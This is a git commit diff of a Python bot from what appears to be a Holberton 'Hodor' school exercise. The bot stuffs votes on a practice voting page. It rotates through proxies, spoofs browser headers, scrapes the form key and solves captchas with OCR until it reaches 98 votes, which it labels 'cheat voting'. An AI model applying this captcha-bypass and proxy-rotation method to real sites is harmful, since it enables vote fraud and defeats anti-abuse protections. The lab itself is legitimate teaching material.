48c8ad6fc5ec21dfd89592b7a5f31ce5d9d682e9
diegojojoayandun <3922@holbertonschool.com>
2022-02-05 15:54:27 -0500

    Ready to Hodor

--- level4/98.py
+++ level4/98.py
@@ -23,11 +23,9 @@ user_agent = ("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) "
 
 header = {"User-Agent": user_agent, "referer": Url}
 
-data = {"id": "3923", "holdthedoor": "submit", "key": "", "captcha": ''}
+data = {"id": "3922", "holdthedoor": "submit", "key": "", "captcha": ''}
 
 _proxy = {"http": "", }
-
-reject = b"See you later hacker! [11]"
 
 
 def get_key(page):
@@ -56,17 +54,14 @@ def read_captcha():
 
 
 def OCR():
-    """Executes tesseract OCR application"""
+    """Executes GOCR OCR application"""
 
-    exec('import subprocess; subprocess.call(["/usr/bin/tesseract", \
-        "/tmp/captcha.png", "/tmp/captcha"])')
+    exec('import subprocess; subprocess.call(["./gocr", \
+        "/tmp/captcha.png", "-o", "/tmp/captcha.txt"])')
 
 
 def get_count():
-    """Return the current vote count of an ID.
-    Args:
-        php (string): The voting website to check.
-        vote_id (string): The Holberton ID to get the vote count of.
+    """Return the current vote count of an ID
     """
     html = get(Url)
     soup = BeautifulSoup(html.text, "html.parser")
@@ -77,45 +72,50 @@ def get_count():
     return False
 
 
-if __name__ == "__main__":
-    i = 0
+def set_counter():
+    """sets the conter variable
+    0 if the Id is new for voting"""
+    if get_count() is False:
+        return 0
+    return get_count()
 
-    while(i < 3):
+
+if __name__ == "__main__":
+
+    i = set_counter()
+    print(i)
+    while(i < 98):
         proxies = proxy()
         for ip in proxies.GetProxies():
             _proxy["http"] = 'http://' + ip
             print('\033[32mConnecting to \033[0m{}'.format(_proxy["http"]))
             try:
+                if (i == 98):
+                    break
 
                 hodor_session = session()
                 page = hodor_session.get(url=Url, headers=header, proxies=_proxy,
-                                        timeout=5)
+                                         timeout=5)
                 data["key"] = get_key(page)
 
                 save_captcha(hodor_session.get(cUrl).content)
                 OCR()
+
                 remove("/tmp/captcha.png")
 
                 data["captcha"] = read_captcha()
 
                 session_response = hodor_session.post(Url, headers=header, data=data,
-                                                    proxies=_proxy, timeout=5)
+                                                      proxies=_proxy, timeout=5)
 
-                vote_counting = get_count()
-
-                if (vote_counting > i) or vote_counting != 3:
-                    print('\033[31mSuccessful vote: \033[32m{}\033[0m'.format(i + 1))
-                    i += 1
-                else:
-                    #print('\033[31mFailed to send: \033[32m{}\033[0m'.format(i + 1))
-                    break
+                print('\033[31mSuccessful vote: \033[32m{}\033[0m'.format(i + 1))
+                i += 1
 
             except:
                 print("\033[31mFailed to connect to proxy {}".format(_proxy["http"]))
 
-
     print("------------------------------------------------------------------")
-    print("ID: \033[32m{}\033[0m, CURRENT VOTES: \033[32m{}\033[0m -- 1024\
+    print("ID: \033[32m{}\033[0m, CURRENT VOTES: \033[32m{}\033[0m -98\
     ".format(data["id"], i))
     print("------------------------------------------------------------------")
     print("\033[32m¡HODOR LEVEL3 SUCCESSFUL CHEAT VOTING!")
